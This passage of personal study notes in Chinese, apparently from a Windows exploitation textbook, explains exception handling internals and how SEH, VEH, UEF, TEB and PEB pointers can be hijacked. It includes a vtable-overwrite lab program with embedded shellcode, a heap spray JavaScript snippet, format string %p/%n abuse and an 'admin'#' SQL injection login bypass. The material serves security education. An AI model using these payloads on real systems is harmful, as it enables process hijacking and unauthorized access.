现在我们可以将前面所给出的**最简单**的**异常处理流程**补充如下。

- 首先执行线程中距离栈顶最近的 S.E.H 的异常处理函数。
- 若失败，则依次尝试执行 S.E.H 链表中后续的异常处理函数。
- 若 S.E.H 链中所有的异常处理函数都没能处理异常，则执行**进程中**的异常处理。

- 若仍然失败，**系统默认的异常处理**将被调用，程序崩溃的对话框将被弹出。

#### （2）线程的异常处理

这里，首先需要补充的是异常处理函数的参数和返回值。

##### 参数

**线程中**的用于**处理异常**的**回调函数**有 **4 个参数**：

- **pExcept**：指向一个非常重要的结构体 EXCEPTION_RECORD。该结构体包含了若干与异常相关的信息，如异常的类型、异常发生的地址等。
- **pFrame**：指向栈帧中的 S.E.H 结构体。
- **pContext**：指向 Context 结构体。该结构体中包含了所有寄存器的状态。
- **pDispatch**：未知用途。

​		在**回调函数执行前**，操作系统会将上述异常发生时的**断点信息压栈**。**根据**这些对**异常的描述**，回调函数可以轻松地**处理异常**。**例如**，遇到除零异常时，可以把相关寄存器的值修改为非 0；内存访问错误时，可以重新把寄存器指回有效地址等。

##### 返回值

​		这种回**调函数返回后**，操作系统会**根据返回的结果**决定下一步应该做什么。异常处理函数可能返回**两种结果**:

​		0 （ExceptionContinueExcetution）：代表异常被成功处理，将返回原程序发生异常的地方， 继续执行后续指令。

```
注意：操作系统是通过传递给回调函数的参数恢复断点信息的，这时的“断点”可能
已经被异常处理函数修改过，例如，若干寄存器的值可能被更改以避免除 0 异常等。
```

​		1 （ExceptionContinueSearch）：代表异常处理失败，将顺着 S.E.H 链表搜索其他可用于异常处理的函数并尝试处理。

##### unwind操作   ？？？？

​		线程的**异常处理中还有**一个比较神秘的操作叫做 **unwind 操作**，这个操作**会对**我们已经建立起来的异常处理流程的概念再做一点修改。

​		当异常发生时，系统会顺着 S.E.H 链表搜索能够处理异常的句柄；**一旦找到了恰当的句柄**， 系统会将已经遍历过的 S.E.H 中的异常处理函数再调用一遍，这个过程就是所谓的 unwind 操 作，这**第二轮的调用**就是 **unwind 调用**。

​		**unwind 调用**的**主要目的**是“**通知**”前边**处理异常失败的 S.E.H**，系统已经准备将它们“遗 弃”了，请它们立刻清理现场，**释放资源**，之后这些 S.E.H 结构体将被从链表中拆除。

​		unwind 操作很好地保证了异常处理机制自身的完整性和正确性。图 6.1.11 描述的是一个由于没有使用 unwind 操作从而导致异常处理机制自身产生错误的例子。

![image-20220427221153343](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220427221153343.png)

​		unwind 操作就是为了在进行多次异常处理，甚至进行互相嵌套的异常处理时（执行异常处理函数中又产生异常），仍能使这套机制稳定、正确地执行而设计的。**unwind 会在真正处理异常之前将之前的 S.E.H 结构体从链表中逐个拆除。**当然，在拆除前会给异常处理函数最后一次释放资源、清理现场的机会，所以我们看到的就是线程的异常处理函数被调用了两次。（个人理解   将真正异常处理之前的SEH 保存至 某个地方，并在栈中释放，进行异常处理，处理完成后再次复原）

​		异常处理函数的第一轮调用用来尝试处理异常，而在第二轮的 unwind 调用时，往往执行的是释放资源等操作。那么，异常回调函数怎么知道自己是被第几次调用的呢？

​		unwind 调用是在回调参数中指明的。对照 MSDN，我们回顾一下回调函数的第一个参数 pExcept 所指向的 EXCEPTION_RECORD 结构体。

```
typedef struct _EXCEPTION_RECORD { 
DWORDExceptionCode; 
DWORDExceptionFlags; //异常标志位
struct _EXCEPTION_RECORD *ExceptionRecord; 
PVOID ExceptionAddress; 
DWORD NumberParameters; 
DWORD ExceptionInformation [EXCEPTION_MAXIMUM_PARAMETERS]; 
 } EXCEPTION_RECORD; 
```

当这个结构体中的 ExceptionCode 被设置为 0xC0000027 （STATUS_UNWIND），并且ExceptionFlags 被设置为 2（EH_UNWINDING）时，对回调函数的调用就属于 unwind 调用。

​		unwind 操作通过 kernerl.32 中的一个导出函数 RtlUnwind 实现，实际上 kernel32.dll 会转而再去调用 ntdll.dll 中的同名函数。MSDN 中有对这个函数的描述。

```
void RtlUnwind( 
 PVOID TargetFrame, 
 PVOID TargetIp, 
 PEXCEPTION_RECORD ExceptionRecord, 
 PVOID ReturnValue 
); 
```

​		最后，还要对栈中的异常处理做最后一点补充：在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。

#### （3）进程的异常处理

​		所有线程中发生的异常如果没有被线程的异常处理函数或调试器处理掉，最终将交给进程 中的异常处理函数处理

​		进程的异常处理回调函数需要通过 API 函数 SetUnhandledExceptionFilter 来注册，其函数 原型如下。

```
LPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilter( 
 LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter 
); 
```

这个函数是 kernel32.dll 的导出函数，MSDN 中有对其的相关描述。

进程的异常处理函数的**返回值有以下 3 种**。

- 1（EXCEPTION_EXECUTE_HANDLER）：表示错误得到正确的处理，程序将退出。 

- 0（EXCEPTION_CONTINUE_SEARCH）：无法处理错误，将错误转交给系统默认的 异常处理。 

- -1（EXCEPTION_CONTINUE_EXECUTION）：表示错误得到正确的处理，并将继续执行下去。类似于线程的异常处理，系统会用回调函数的参数恢复出异常发生时的断点状况，但这时引起异常的寄存器值应该已经得到了修复。

| 提示：可以简单地把线程异常处理对应为代码中的__try{} __ except(){}或者 Assert 等语句，把进程的异常处理对应于函数 SetUnhandledExceptionFilter。 |
| ------------------------------------------------------------ |

#### （4）系统默认的异常处理 U.E.F

​		如果**进程异常处理失败**或者**用户**根本**没有注册进程异常处理**，**系统默认**的异常处理函数 UnhandledExceptionFilter（）会**被调用**。看到函数名，顾名思义，这个函数好像一个“筛选器”， **所有无法处理的异常**都将被它捕获并处理，**不会出现任何漏网之鱼。**有时我们会将这个“终极” 异常处理函数简称为 U.E.F（Unhandled Exception Filter）

​		UnhandledExceptionFilter（）将首先检查注册表 HKLM\SOFTWARE\Microsoft\WindowsNT\  CurrentVersion\AeDebug 下的表项，如图 6.1.12 所示。

![image-20220427230712358](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220427230712358.png)

​		路径下的 Auto 表项代表是否弹出错误对话框，值为 1 表示不弹出错误对话框直接结束程序，其余值均会弹出提示错误的对话框。图 6.1.13 和图 6.1.14 分别是 Windows 2000 和 Windows XP 下这个对话框的样子

![image-20220427230800421](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220427230800421.png)

​		注册表的 Debugger 指明了系统默认的调试器，在错误框弹出后，如果您选择调试， UnhandledExceptionFilter 就会按照这里的命令加载相应的调试器。

#### （5）异常处理流程的总结

至此，异常处理的流程已经被扩充地与真实的流程比较接近了，总结出以下几点：

- CPU 执行时发生并捕获异常，内核接过进程的控制权，开始内核态的异常处理。

- 内核异常处理结束，将控制权还给 ring3。

- ring3 中第一个处理异常的函数是 ntdll.dll 中的 KiUserExceptionDispatcher()函数。

- KiUserExceptionDispatcher()首先检查程序是否处于调试状态。如果程序正在被调试，会将异常交给调试器进行处理。
- 在非调试状态下，KiUserExceptionDispatcher()调用 RtlDispatchException()函数对线程的 S.E.H 链表进行遍历，如果找到能够处理异常的回调函数，将再次遍历先前调用过的 S.E.H 句柄，即 unwind 操作，以保证异常处理机制自身的完整性。
- 如果栈中所有的 S.E.H 都失败了，且用户曾经使用过 SetUnhandledExceptionFilter()函
  数设定进程异常处理，则这个异常处理将被调用。
- 如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么系
  统默认的异常处理 UnhandledExceptionFilter()将被调用。U.E.F 会根据注册表里的相关
  信息决定是默默地关闭程序，还是弹出错误对话框。

以上就是 Windows 异常处理的基本流程。需要额外注意的是，这个流程是基于 Windows 2000 平台的， Windows XP 及其以后的操作系统的异常处理流程大致相同，只是KiUserExceptionDispatcher()在遍历栈帧中的 S.E.H 之前，会去先尝试一种新加入的异常处理类型 V.E.H（Vectored Exception Handling）。

### 6.1.5 其他异常处理机制的利用思路

#### 1．V.E.H 利用

​		从 Windows XP 开始，在仍然全面兼容以前的 S.E.H 异常处理的基础上，微软又增加了一 种新的异常处理：V.E.H（Vectored Exception Handler，向量化异常处理）

​		（1）V.E.H 和进程异常处理类似，都是基于进程的，而且需要使用 API 注册回调函数。相 关 API 如下所示

```
        PVOID AddVectoredExceptionHandler( 
         ULONG FirstHandler, 
         PVECTORED_EXCEPTION_HANDLER VectoredHandler 
        );
```

（2）MSDN 上有对 V.E.H 结构的描述

```
        struct _VECTORED_EXCEPTION_NODE
        { 
         DWORD m_pNextNode; 
         DWORD m_pPreviousNode; 
         PVOID m_pfnVectoredHandler; 
         } 
```

（3）可以注册多个 V.E.H，V.E.H 结构体之间串成双向链表，因此比 S.E.H 多了一个前向 指针。 

（4）V.E.H 处理优先级次于调试器处理，高于 S.E.H 处理；即 KiUserExceptionDispatcher() 首先检查是否被调试，然后检查 V.E.H 链表，最后检查 S.E.H 链表。 

（5）注册 V.E.H 时，可以指定其在链中的位置，不一定像 S.E.H 那样必须按照注册的顺序 压入栈中，因此，V.E.H 使用起来更加灵活。 

（6）V.E.H 保存在堆中。

 （7）最后，unwind 操作只对栈帧中的 S.E.H 链起作用，不会涉及 V.E.H 这种进程类的异常 处理。

 		我们已经知道，在 Windows XP 以后，微软为 Windows 加入了 V.E.H 异常处理，并优先于 S.E.H 使用。V.E.H 被组织成双向链表的形式，当异常发生时，系统将遍历这个链表并依次使用 V.E.H 中的句柄，尝试处理异常。

​	 David Litchfield 在 Black Hat 上的演讲“Windows heap overflows”（http://www.blackhat.com/  presentations/win-usa-04/bh-win-04-litchfield/bh-win-04-litchfield.ppt）中提出，如果能够利用堆 溢出的 DWORD SHOOT 修改指向 V.E.H 头节点的指针，在异常处理开始后，将能够引导程序 去执行 shellcode。 

​		David 在论文中指出，标识 V.E.H 链表头节点的指针位于 0x77FC3210，并且还为这种利用 方式给出了两段 POC 代码，有兴趣的朋友可以深入研究这篇文章。

#### 2．攻击 TEB 中的 S.E.H 头节点

​		异常发生时，异常处理机制会遍历 S.E.H 链表寻找合适的出错函数。前面已经介绍过， 线程的 S.E.H 链通过 TEB 的第一个 DWORD 标识(fs:0)，这个指针永远指向离栈顶最近的那 个 S.E.H。如果能够修改 TEB 中的这个指针，在异常发生时就能将程序引导到 shellcode 中去 执行

​		这种方法最早是由 Halvar F lake 在 Black Hat 的著名演讲“Third Gen eration Exploitation” （http://www.blackhat.com/presentations/win-usa-02/halvarflake-winsec02.ppt）中提出。

​		 Halvar Flake 同时也指出了这种利用方法的一些局限性。要理解这种局限性，需要简单了 解一下 TEB 的知识。

（1）一个进程中可能同时存在多个线程。 

（2）每个线程都有一个线程环境块 TEB。 

（3）第一个 TEB 开始于地址 0x7FFDE000。 

（4）之后新建线程的 TEB 将紧随前边的 TEB，之间相隔 **0x1000 字节**，并**向内存低址方向增长**

（5）当线程退出时，对应的 TEB 也被销毁，腾出的 TEB 空间可以被新建的线程重复使用。 线程环境块位置的预测如图 6.1.15 所示。

![image-20220429105625640](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429105625640.png)

​		当**遇到多线程的程序**（尤其是服务器程序）时，我们**将很难判断当前的线程**是哪一个，以 及对应的 T**EB 在什么位置**。因此，攻击 TEB 中 S.E.H 头节点的方法一般用于单线程的程序。

#### 3．攻击 U.E.F

​		U.E.F（UnhandledExceptionFilter()）即系统默认的异常处理函数，是系统处理异常的最后一个环节。如果能够**利用堆溢出产生的 DWORD SHOOT 把**这个“终极异常处理函数”的**调用句柄覆盖为 shellcode 的入口地址**，再制造一个**其他异常处理都无法解决的异常**，那么 当系统使用 U.E.F 作为最后一根救命稻草来解决异常时，shellcode 就可以堂而皇之地得到 执行。

​		这种方法最早也是由 Halvar Flak e 提出的。由于 U.E.F 句柄在不同操作系统和补丁版本下 可能不同，Halvar Flak e 在“Third Generation Exploitation”中同时还给出了确定 U.E.F 句柄的 具体方法，那就是反汇编 kernel32.dll 中的导出函数 SetUnhandledExceptionFilter()

​		以 Windows 2 000 为例，将 kernel32.dll 拖进 IDA，稍等片刻，待自动分析结束，单击 “Functions”选项卡，会列出文件内所有的函数名，键入 SetUnhandledExceptionFilter 会自动定位到这个函数，并显示出这个函数的入口地址等信息，如图 6.1.16 所示。

​		双击这个函数，IDA 会自动跳转到这个函数的反汇编代码处，如图 6.1.17 所示。

​	其中，0x77EC044C 就是存放系统默认异常处理函数入口地址的地方。

![image-20220429111727693](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429111727693.png)

David Litchfield 在谈到 U.E.F 利用时补充到结合使用跳板技术能够使 exploit 成功率更高。

David 指出在异常发生时，EDI 往往仍然指向堆中离 shellcode 不远的地方，把 U.E.F 的句柄覆盖成一条 call dword ptr [edi+0x78]的指令地址往往就能让程序跳到 shellcode 中，除此以 外，指令

```
call dword ptr [ESI+0x4C] 
call dword ptr[EBP+0x74] 
```

有时也能起到同样的定位 shellcode 的作用。

 依以往的调试经验，EBX、EAX 等寄存器有时也会指向堆中；另外，堆溢出中跳板的选择 不像栈溢出中有 jmp esp 作为“保留曲目”，利用 EDI 的跳转并不能保证百分之百的成功。 

总之，堆溢出的跳板选择依赖于调试时的具体情况，没有定法，有时还需要一点灵感。

#### 4．攻击 PEB 中的函数指针

第 5 章堆溢出中最后一个实验中，当 U.E.F 被使用后，将最终调用 ExitProcess()来结束程序。ExitProcess()在清理现场的时候需要进入临界区以同步线程，因此会 调用 RtlEnterCriticalSection()和 RtlLeaveCriticalSection()

ExitProcess()是通过存放在 PEB 中的一对指针来调用这两个函数的，如果能够在 DWORD  SHOOT 时把 PEB 中的这对指针修改成 shellcode 的入口地址，那么，在程序最终结束时， ExitProcess()将启动 shellcode。 

这种方法也是 David Litchfield 在“Windows heap overflows”中首次提出的。比起位置不固 定的 TEB，PEB 的位置永远不变，因此，David Litchfield 提出的这种方法比 Halvar Flake 所说 的淹没 TEB 中 S.E.H 链头节点的方法更加稳定可靠。

## 6.2 “off by one”的利用 

​		Halvar Flake 在“Third Generation Exploitation”中，按照攻击的难度把漏洞利用技术分成 3 个层次。 

（1）第一类是**基础的栈溢出利用**。攻击者可以**利用返回地址**等轻松劫持进程，植入 shellcode，例如，对 strcpy、strcat 等函数的攻击等。 

（2）第二类是**高级的栈溢出利用**。这时，栈中有诸多的限制因素，溢出数据往往只能淹没部分的 EBP，而无法抵达返回地址的位置。因此，直接淹没返回地址获得 EIP 的控制权是不可能的。这种漏洞利用的典型例子就是对 strncpy 函数误用时产生的“off by one”漏洞的利用。 

（3）第三类攻击则是堆溢出利用及格式化串漏洞的利用。格式化串漏洞的利用将在第 8 章 中介绍。

​	本节将简要介绍一下 Halvar Flake 所谈到的第二类攻击，即对“off by one”漏洞的利用 思路。



```
void off_by_one(char * input) 
{ 
        char buf[200]; 
        int i=0,len=0; 
        len=sizeof(buf); 
        for(i=0; input[i]&&(i<=len); i++) 
        { 
        buf[i]=input[i]; 
        } 
        ……
} 
```

​	函数试图防止在进行字符串复制时发生数组越界，然而，循环控制中的判断 “i<=len” 仍然给了攻击者一个字节的溢出机会——正确的使用应该是“i<len”。C语言数组从 0 开始的约定很容易让程序在数组边界位置出错，这种**边界控制上的错误**就是所谓的**“off by one”**问题。

​		只溢出一个字节在大多数情况下并不是一件非常严重的事情，也许只能算得上是 bug。然 而，配合上特定的溢出场景，off by one 就有可能演化为安全漏洞

​		当缓冲区后面紧跟着 EBP 和返回地址时，溢出数组的那一个字节正好“部分”地破坏了 EBP。由于 Intel x86 大顶机的位序模式，这多余的一个字节最终将被作为 EBP 的最低位字节解 释，也就是说，我们能在 **255 个字节的范围内移动 EBP**，如图 6.2.1 所示。

![image-20220429144714230](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429144714230.png)

​		当能够让 EBP 恰好植入可控制的缓冲区时，是有可能做到劫持进程的。此外，off by one 问题有可能破坏重要的邻接变量，从而导致程序流程改变或者整数溢出等更深层次的问题。

## 6.3 攻击 C++的虚函数

​		抛开面向对象不谈，仅仅关注漏洞利用，我们可以简单地把虚函数和虚表理解为以下几个 要点。 

（1）C++类的成员函数在声明时，若使用关键字 virtual 进行修饰，则被称为虚函数。 

（2）一个类中可能有很多个虚函数。 

（3）**虚函数**的**入口地址**被统一**保存**在**虚表**（Vtable）中。 

（4）对象在使用虚函数时，**先通过虚表指针找到虚表**，**然后从虚表中取出**最终的**函数入口地址进行调用**。 

（5）虚表指针保存在对象的内存空间中，**紧接着虚表指针的是其他成员变量**。 

（6）虚函数只有通过对象指针的引用才能显示出其动态调用的特性。

虚函数的实现如图 6.3.1.所示。

![image-20220429151707281](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429151707281.png)

​		如果对象中的成员变量发生了溢出，有机会**修改**对象中的**虚表指针**或修改虚表中的**虚函数指针**，那么在程序调用虚函数时就会跑去执行 shellcode。

下面这段程序用于演示这种漏洞利用方式。

debug



```
#include "windows.h" 
#include "iostream.h" 
char shellcode[]= 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x44\xe2\x42\x00";//set fake virtual function pointer 
class Failwest 
{ 
public: 
char buf[200]; 
virtual void test(void) 
{ 
cout<<"Class Vtable::test()"<<endl; 
} 
}; 
Failwest overflow, *p; 
void main(void) 
{ 
        char * p_vtable; 
        p_vtable=overflow.buf-4;//point to virtual table 
        //reset fake virtual table to 0x004088cc 
        //the address may need to ajusted via runtime debug 
        p_vtable[0]=0xf4; 
        p_vtable[1]=0xe2; 
        p_vtable[2]=0x42; 
        p_vtable[3]=0x00; 
        strcpy(overflow.buf,shellcode);//set fake virtual function 
         pointer 
        p=&overflow; 
        p->test(); 
} 
```

对这段程序需要说明如下。

（1）printf("%p",&overflow.buf);通过此语句找到BUF的起始地址，不同操作系统地址可能不同，此实验  BUF的起始地址为 **0x0042e244** 

（2）**虚表指针位于成员变量 char buf[200]之前**，程序中**通过 p_vtable=overflow.buf-4 定位**到这个指针。 

（3）修改虚表指针指向缓冲区的 0x0042e2f4 处。（缓冲区只用了  11*16  ）

（4）程序执行到 p->test()时，将按照伪造的虚函数指针去 0x0042e2f4 寻找虚表，这里正好是缓冲区里 shellcode 的末尾。在这里填上 shellcode 的起始位置 0x0040e244 作为伪造的虚函 数入口地址，程序将最终跳去执行shellcode，如图 6.3.2 所示

结果如图：

![image-20220430105936214](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220430105936214.png)

​		由于虚表指针位于成员变量之前，溢出只能向后覆盖数据，所以很可惜这种利用方式在“栈溢出”场景下有一定局限性。

```
题外话：之所以给“栈溢出”打引号，是因为对象的内存空间位于堆中。然而，称之为“堆溢出”也不很恰当，因为这里所讨论的仍然是连续的线性覆盖，没有涉及DWORD SHOOT。也许，这里比较准确的描述是“数组溢出”或“连续性覆盖”。
```

​		当然，如果内存中存在多个对象且能够溢出到下一个对象空间中去，“连续性覆盖”还是 有攻击的机会的，如图 6.3.4 所示。 

​		对于 DWORD SHOOT 的利用场景，攻击虚函数会更容易些。修改虚表指针或直接修改虚 函数指针都是不错的选择。

## 6.4 Heap Spray：堆与栈的协同攻击

​		在针对浏览器的攻击中，常常会结合使用堆和栈协同利用漏洞。 

（1）当浏览器或其使用的 ActiveX 控件中存在溢出漏洞时，攻击者就可以生成一个特殊的 HTML 文件来触发这个漏洞。 

（2）不管是堆溢出还是栈溢出，漏洞触发后最终能够获得 EIP。 

（3）有时我们可能很难在浏览器中复杂的内存环境下布置完整的 shellcode。 

（4）页面中的 JavaScript 可以申请堆内存，因此，把 shellcode 通过 JavaScript 布置在堆中 成为可能。

​		堆分配的地址通常有很大的随机性，把 shellcode 放在堆中怎么进行定位呢？解决这个问题的方法就是本节将介绍的 Heap Spray 技术。

​		Heap Spray 技术是 Blazde 和 SkyLined 在 2004 年为 IE 中的 IFRAME 漏洞写的 exploit （http://www.edup.tudelft.nl/~bjwever/advisory_iframe.html.php）中第一次使用的，该漏洞的微软编号为 MS04-040，CVE 编号为 CVE-2004-1050。现在，这种技术已经发展为对浏览器攻击的 经典方法，并被“网马”所普遍采用。

​		在**使用 Heap Spray** 的时候，一般会**将 EIP 指向堆区**的 **0x0C0C0C0C** 位置，然**后用 JavaScript 申请大量堆**内存，并**用包含着 0x90 和 shellcode 的“内存片”覆盖**这些内存。

​		 通常，JavaScript 会从内存低址向高址分配内存，因此申请的内存超过 200MB（200MB=200 ×1024×1024 = 0x0C800000 > 0x0C0C0C0C）后，0x0C0C0C0C 将被含有 shellcode 的内存片覆盖。只要内存片中的 0x90 能够命中 0x0C0C0C0C 的位置，shellcode 就能最终得到执行。这个 过程如图 6.4.1 所示。

![image-20220430153609612](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220430153609612.png)

可以用类似下面这样的 JavaScript 产生的内存片来覆盖内存

```
var nop=unescape("%u9090%u9090"); 
while (nop.length<= 0x100000/2) 
{ 
		nop+=nop; 
}//生成一个 1MB 大小充满 0x90 的数据块
nop = nop.substring(0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2 ); 
var slide = new Arrary(); 
for (var i=0; i<200; i++) 
{ 
slide[i] = nop + shellcode 
} 

```

对于这段 JavaScript 需要解释如下。 

（1）每个内存片大小为 1MB。 

（2）首先产生一个大小为 1MB 且全部被 0x90 填满的内存块。 

（3）由于 Java 会为申请到的内存填上一些额外的信息，为了保证内存片恰好是 1MB，我 们将这些额外信息所占的空间减去。具体说来，这些信息如表 6-4-1 所示。

 在考虑了上述因素及 shellcode 的长度后，nop = nop.substring(0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2 )将一个内存片恰好凑成 1MB 大小。

![image-20220430153757642](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220430153757642.png)

（4）如图 6.4.2 所示，最终我们将使用 200 个这种形式的内存片来覆盖堆内存，只要其中 任意一片的 nop 区能够覆盖 0x0C0C0C0C，攻击就可以成功。

![image-20220430153817842](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220430153817842.png)

为什么采用 1MB 大小作为内存片的单位呢？

​		在 Heap Spray 时，内存片相对于 shellcode 和 额外的内存信息来说应该“足够大”，这样 nop 区域命中 0x0C0C0C0C 的几率将相对增加；如 果内存片较小，shellcode 或额外的内存信息将有可能覆盖 0x0C0C0C0C，导致溢出失败。1MB 的内存相对于 200 字节左右的 shellcode，可以让 exploit 拥有足够的稳定性。

# 第 8 章 其他类型的软件漏洞？？？

## 8.1 格式化串漏洞

### 8.1.1 printf 中的缺陷

​		**格式化串漏洞产生**于**数据输出函数**中**对输出格式解析的缺陷**。以最熟悉的 printf 函数为例， 其参数应该含有两部分：格式控制符和待输出的数据列表。

```
#include "stdio.h" 
main() 
{ 
 int a=44,b=77; 
 printf("a=%d,b=%d\n",a,b); 
 printf("a=%d,b=%d\n"); 
}
```

​		对于上述代码，第一个 printf 调用是正确的，第二个调用中则缺少了输出数据的变量列表。 那么第二个调用将引起编译错误还是照常输出数据？如果输出数据又将是什么类型的数据呢？

```
win2000  vc6.0  release  
```

运行结果如图：

![image-20220501100417967](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220501100417967.png)

​								printf 函数的缺陷

​		第二次调用没有引起编译错误，程序正常执行，只是输出的数据有点出乎预料。使用 OllyDbg 调试一下，得到“a=4218928,b=44”的原因就真相大白了。

​		第**一次调用 printf** 的时候，**参数**按照从**右向左的顺序入栈**，栈中状态如图 8.1.2 所示。

![image-20220501104548109](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220501104548109.png)

​		当**第二次调用**发生时，由于**参数中少了输入数据列表部分**，故**只压入格式控制符参数**，这时栈中状态如图 8.1.3 所示。

![image-20220501104610041](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220501104610041.png)

​		虽然**函数调用时没有给出“输出数据列表”**，但**系统**仍然**按照“格式控制符”**所指明的方式**输出**了栈中**紧随其后的两个 DWORD。**现在应该明白输出“a=4223024,b=44”的原因了： 4223024 的十六进制形式为 0x00407030，是**指向格式控制符“a=%d,b=%d\n”的指针**；44 是残留下来的变量 a 的值。

### 8.1.2 用 printf 读取内存数据

​		到此为止，这个问题还只是一个 bug，算不上漏洞。但如果 printf 函数参数中的“格式控 制符”可以被外界输入影响，那就是所谓的格式化串漏洞了。对于如下代码：

```
#include "stdio.h" 
int main(int argc, char ** argv) 
{ 
 printf(argv[1]); 
} 
win2000 release
/*
格式控制符“%p”中的p是pointer（指针）的缩写。指针的值是语言实现（编译程序）相关的，但几乎所有实现中，指针的值都是一个表示地址空间中某个存储器单元的整数。printf函数族中对于%p一般以十六进制整数方式输出指针的值
	%d：用来输出有符号的十进制整数（包括char类型）
	%u：用来输出无符号的十进制整数（包括char类型）
　　%o：用来输出无符号的八进制整数
　　%x：用来输出无符号的十六进制整数
　　%c：用来输出单个字符
　　%s：用来输出一个字符串
　　%f：用来输出小数形式的十进制浮点数（输入时小数形式和指数形式都可以识别）
　　%e：用来输出指数形式的十进制浮点数（输入时小数形式和指数形式都可以识别）
　　%g：用来输出指数形式和小数形式两者中较短的十进制浮点数（输入时小数形式和指数形式都可以识别）
*/
```

​		当我们向程序传入普通字符串（如“failwest”）时，将得到简单的反馈。但如果传入的字 符串中带有格式控制符时，printf 就会打印出栈中“莫须有”的数据。 例如，输入“%p,%p,%p……”，实际上可以读出栈中的数据，如图

![image-20220501111333003](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220501111333003.png)

### 8.1.3 用 printf 向内存写数据

​		只是允许读数据还不算很糟糕，但是如果配合上修改内存数据，就有可能引起进程劫持和 shellcode 植入了。

​		在格式化控制符中，有一种鲜为人知的**控制符%n**。这个控制符**用于把当前输出的所有数据的长度写回一个变量中去**，下面这段代码展示了这种用法。

```
#include "stdio.h" 
int main(int argc, char ** argv) 
{ 
 int len_print=0; 
 printf("before write: length=%d\n",len_print); 
 printf("failwest:%d%n\n",len_print,&len_print); 
 printf("after write: length=%d\n",len_print); 
}
```

​		第二次 printf 调用中使用了%n 控制符，它会将这次调用最终输出的字符串长度写入变量 len_print 中。“failwest:0”长度为 10，所以这次调用后 len_print 将被修改为 10。

![image-20220501112258303](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220501112258303.png)

### 8.1.4 格式化串漏洞的检测与防范

​		**当输入输出函数的格式化控制符能够被外界影响时**，攻击者可以综合利用前面介绍的**读内存和写内存的方法修改函数返回地址**，劫持进程，从而使 shellcode 得到执行。

​		 比起大量使用命令和脚本的 UNIX 系统，Windows 操作系统中命令解析和文本解析的操作并不是很多，再加上这种类型的漏洞发生的条件比较苛刻，使得格式化串漏洞的实际案例非常罕见。 堆栈溢出漏洞往往被复杂的程序逻辑所掩盖，给漏洞检测造成一定困难。相对而言，格式化串漏洞的起因非常简单，只要检测相关函数的参数配置是否恰当就行。通常能够引起这种漏 洞的函数包括：

```
int printf( const char* format [, argument]... ); 
int wprintf( const wchar_t* format [, argument]... ); 
int fprintf( FILE* stream, const char* format [, argument ]...); 
int fwprintf( FILE* stream, const wchar_t* format [, argument ]...); 
int sprintf( char *buffer, const char *format [, argument] ... ); 
int swprintf( wchar_t *buffer, const wchar_t *format [, argument] ... );
int vprintf( const char *format, va_list argptr ); 
int vwprintf( const wchar_t *format, va_list argptr ); 
int vfprintf( FILE *stream, const char *format, va_list argptr ); 
int vfwprintf( FILE *stream, const wchar_t *format, va_list argptr ); 
int vsprintf( char *buffer, const char *format, va_list argptr ); 
int vswprintf( wchar_t *buffer, const wchar_t *format, va_list argptr );
```

​		所以，通过简单的静态代码扫描，一般可以比较容易地发现这类漏洞。此外，VS2005 中 在编译级别对参数做了更好的检查，而且默认情况下关闭了对“%n”控制符的使用。

## 8.2 SQL 注入攻击（web）

### 8.2.1 SQL 注入原理 

​		**SQL 命令注入**的漏洞是 **Web 系统特有**的一类漏洞，它源于 PHP、ASP 等脚本语言对用户输入数据和解析时的缺陷。

​		以 PHP 语言为例，如果用户的**输入**能**够影响到脚本中 SQL 命令串的生成**，那么很可能在添加了单引号、#号等转义命令字符后，能够改变数据库最终执行的 SQL 命令。

​		如图 8.2.1 所示，如果程序员在编程时没有对用户输入的变量$u 和$p 进行合理的限制，那么当攻击者把用户名输入为 admin’#的时候，**输入字串中的单引号将和脚本中的变量的单引号 形成配对**，而输入字串中的“#”号对于 My SQL 的语言解释器来说是一行注释符，因此后边 的语句将被当做注释处理。在上述例子中，通过这样的输入，攻击者可以轻易绕过身份验证机 制，没有正确的密码也能看到管理员的信息。

